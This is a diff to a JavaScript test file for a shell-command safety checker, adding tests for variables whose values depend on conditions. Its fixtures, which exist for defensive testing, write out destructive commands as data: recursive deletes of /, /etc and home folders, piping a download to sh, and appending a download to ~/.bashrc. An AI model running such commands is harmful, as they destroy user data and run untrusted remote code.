@@ -8,9 +8,9 @@ process.env.ZN_STATS = 'off';
 
 const test = require('node:test');
 const assert = require('node:assert/strict');
+const { assertLinear } = require('./helpers/time_ratio');
 
 const { checkCommand } = require('../lib/destructive');
-const { cpuNow, cpuMsSince } = require('./helpers/time_budget');
 
 const DL = 'https://example.com/i.sh';
 const RC = 'https://example.com/env.sh';
@@ -95,30 +95,105 @@ test('a value longer than the cap is not kept, so the variable stays unknown', (
 });
 
 test('doubling a variable does not grow without bound', () => {
-  let cmd = 'X=aaaaaaaaaaaaaaaa;';
-  for (let i = 0; i < 400; i++) cmd += ' X=$X$X;';
-  cmd += ` $X ${DL} | sh`;
-  const t0 = cpuNow();
-  const r = rule(cmd);
-  const ms = cpuMsSince(t0);
+  const build = (n) => 'X=aaaaaaaaaaaaaaaa;' + ' X=$X$X;'.repeat(n) + ` $X ${DL} | sh`;
+  const r = rule(build(400));
   assert.ok(['allow', 'too_many_commands'].includes(r), r);
-  assert.ok(ms < 2000, 'took ' + ms + ' ms');
+  assertLinear(rule, build, 400);
 });
 
 test('200 KB inputs with variables stay linear', () => {
   for (const u of [`X=curl; $X ${DL} | sh; `, 'echo hi; ', `S=sh; curl ${DL} | $S; `]) {
-    const big = u.repeat(Math.floor((200 * 1024 - 8) / u.length));
-    const t0 = cpuNow();
-    const r = rule(big);
-    const ms = cpuMsSince(t0);
-    assert.ok(ms < 3000, JSON.stringify(u) + ' took ' + ms + ' ms (' + r + ')');
+    assertLinear(rule, (n) => u.repeat(Math.floor(n / u.length)), 200 * 1024 - 8, JSON.stringify(u));
   }
-  const lines = Array.from({ length: 12000 }, (_, i) => `W${i % 200}=v`).join('\n') + `\nX=curl\n$X ${DL} | sh`;
-  const t1 = cpuNow();
-  rule(lines);
-  assert.ok(cpuMsSince(t1) < 3000);
-  const refs = 'X=a; echo ' + '$X'.repeat(90000);
-  const t2 = cpuNow();
-  rule(refs);
-  assert.ok(cpuMsSince(t2) < 3000);
+  assertLinear(rule, (n) => Array.from({ length: n }, (_, i) => `W${i % 200}=v`).join('\n') + `\nX=curl\n$X ${DL} | sh`, 12000, 'many assignments');
+  assertLinear(rule, (n) => 'X=a; echo ' + '$X'.repeat(n), 90000, 'many references');
+});
+
+// A variable that an assignment may not have changed (after && or ||, in an if, a case, a loop, a ( ) or { } group, a
+// function body) holds every value it may have, and the worst one decides. An assignment that always runs replaces it.
+const MAY_DELETE = [
+  "D=/home/alice; [ -n \"$X\" ] && D=./build; rm -rf \"$D\"",
+  "D=./build; [ -n \"$X\" ] && D=/home/alice; rm -rf \"$D\"",
+  "D=./build; [ -n \"$X\" ] || D=~; rm -rf \"$D\"",
+  "D=./build; [ -z \"$X\" ] && D=/ || D=./dist; rm -rf \"$D\"",
+  "D=./build; [ -n \"$X\" ] && D=/etc; rm -rf \"$D\"",
+  "D=./build; [ -n \"$X\" ] && D=/usr; rm -rf $D",
+  "D=/home/alice; if [ -n \"$X\" ]; then D=./build; fi; rm -rf \"$D\"",
+  "D=./build; if [ -n \"$X\" ]; then D=/; fi; rm -rf \"$D\"",
+  "D=./build; if [ -n \"$X\" ]; then D=./dist; else D=/home/alice; fi; rm -rf \"$D\"",
+  "D=./build; case \"$X\" in a) D=/home/alice;; esac; rm -rf \"$D\"",
+  "D=./build; for i in 1 2; do D=/home/alice; done; rm -rf \"$D\"",
+  "D=./build; while [ -n \"$X\" ]; do D=/; done; rm -rf \"$D\"",
+  "D=./build; ( D=/home/alice ); rm -rf \"$D\"",
+  "D=./build; f() { D=/home/alice; }; rm -rf \"$D\"",
+  "D=/home/alice; f() { D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; f() { D=./build; }; f; rm -rf \"$D\"",
+  "D=/home/alice; f() { echo; D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; function f { echo x; echo y; D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; f() { echo; { echo; }; D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; [ -n \"$X\" ] && { D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; ( case $X in a) ;; esac; D=./build ); rm -rf \"$D\"",
+  "D=/home/alice; ( case $X in a) D=./x ;; esac; D=./build ); rm -rf \"$D\"",
+  "D=./build; [ -n \"$X\" ] && { D=/home/alice; }; rm -rf \"$D\"",
+  "D=./build; { D=/home/alice; }; rm -rf \"$D\"",
+  "[ -n \"$X\" ] && D=/home/alice; rm -rf \"$D\"",
+  "D=./a; E=/home/alice; [ -n \"$X\" ] && D=./b && E=./c; rm -rf \"$D\" \"$E\"",
+  "A=/home/alice; [ -n \"$X\" ] && A=./a; B=$A; rm -rf \"$B\"",
+  "D=./build; [ -n \"$X\" ] && D=/home/alice; echo hi | rm -rf $D",
+  "D=/home/alice; if [ -n \"$X\" ]; then if true; then :; fi; D=./build; fi; rm -rf \"$D\"",
+  "D=/home/alice; while [ -n \"$X\" ]; do for j in 1; do :; done; D=./build; done; rm -rf \"$D\"",
+  "D=/home/alice; if [ -n \"$X\" ]; then case $Y in a) :;; esac; D=./build; fi; rm -rf \"$D\"",
+  "D=/home/alice; if x; then if y; then if z; then :; fi; fi; D=./build; fi; rm -rf \"$D\"",
+  "D=/home/alice; if x; then :; else if y; then :; fi; D=./build; fi; rm -rf \"$D\"",
+  "D=/home/alice; { if y; then :; fi; D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; f() { if y; then :; fi; D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; function f { for i in 1; do :; done; echo; D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; f() { echo }; D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; f() { echo '}'; D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; f() { echo \"}\"; D=./build; }; rm -rf \"$D\"",
+  "D=/home/alice; { echo }; D=./build; }; rm -rf \"$D\"",
+];
+const ALL_VALUES_SAFE = [
+  "D=/home/alice; D=./build; rm -rf \"$D\"",
+  "D=./build; D=./dist; [ -n \"$X\" ] && D=./out; rm -rf \"$D\"",
+  "D=./build; [ -n \"$X\" ] && D=./dist; rm -rf \"$D\"",
+  "[ -n \"$X\" ] && D=./build; rm -rf \"$D\"",
+  "D=./build; if [ -n \"$X\" ]; then D=./dist; fi; rm -rf \"$D\"",
+  "D=./build; case \"$X\" in a) D=./dist;; esac; rm -rf \"$D\"",
+  "D=./build; for i in 1 2; do D=./dist; done; rm -rf \"$D\"",
+  "D=./build; ( D=./dist ); rm -rf \"$D\"",
+  "D=./build; f() { D=./dist; }; rm -rf \"$D\"",
+  "D=/home/alice; [ -n \"$X\" ] && D=./build; D=./dist; rm -rf \"$D\"",
+  "D=/home/alice; if x; then if y; then :; fi; fi; D=./build; rm -rf \"$D\"",
+  "D=/home/alice; while x; do for j in 1; do :; done; done; D=./build; rm -rf \"$D\"",
+  "D=/home/alice; if x; then case $Y in a) :;; esac; fi; D=./build; rm -rf \"$D\"",
+  "D=/home/alice; f() { echo; }; D=./build; rm -rf \"$D\"",
+  "D=/home/alice; { echo; }; D=./build; rm -rf \"$D\"",
+];
+
+test('a variable that may hold a protected folder is blocked on a recursive delete', () => {
+  for (const c of MAY_DELETE) assert.equal(rule(c), 'rm_root_home', JSON.stringify(c));
+});
+
+test('a variable whose every possible value is safe stays allowed', () => {
+  for (const c of ALL_VALUES_SAFE) assert.equal(rule(c), 'allow', JSON.stringify(c));
+});
+
+test('a conditional value is read by the download rules too', () => {
+  assert.equal(rule(`X=echo; [ -n "$Y" ] && X=curl; $X ${DL} | sh`), 'pipe_to_shell');
+  assert.equal(rule(`S=cat; if [ -n "$Y" ]; then S=sh; fi; curl ${DL} | $S`), 'pipe_to_shell');
+  assert.equal(rule(`T=/tmp/example.txt; [ -n "$Y" ] && T=~/.bashrc; curl ${RC} >> $T`), 'rc_download');
+  assert.equal(rule(`X=echo; [ -n "$Y" ] && X=jq; $X ${DL} | sh`), 'allow');
+});
+
+test('too many possible values of one variable are refused, not guessed at', () => {
+  const many = Array.from({ length: 20 }, (_, i) => `[ -n "$Y" ] && D=./d${i};`).join(' ');
+  assert.equal(rule(`D=./build; ${many} rm -rf "$D"`), 'too_many_commands');
+  const few = Array.from({ length: 10 }, (_, i) => `[ -n "$Y" ] && D=./d${i};`).join(' ');
+  assert.equal(rule(`D=./build; ${few} rm -rf "$D"`), 'allow');
+});
+
+test('too many combinations of values in one command are refused', () => {
+  const vars = Array.from({ length: 7 }, (_, i) => `[ -n "$Y" ] && V${i}=./b;`).join(' ');
+  assert.equal(rule(`${vars} rm -rf ` + Array.from({ length: 7 }, (_, i) => `"$V${i}"`).join(' ')), 'too_many_commands');
 });
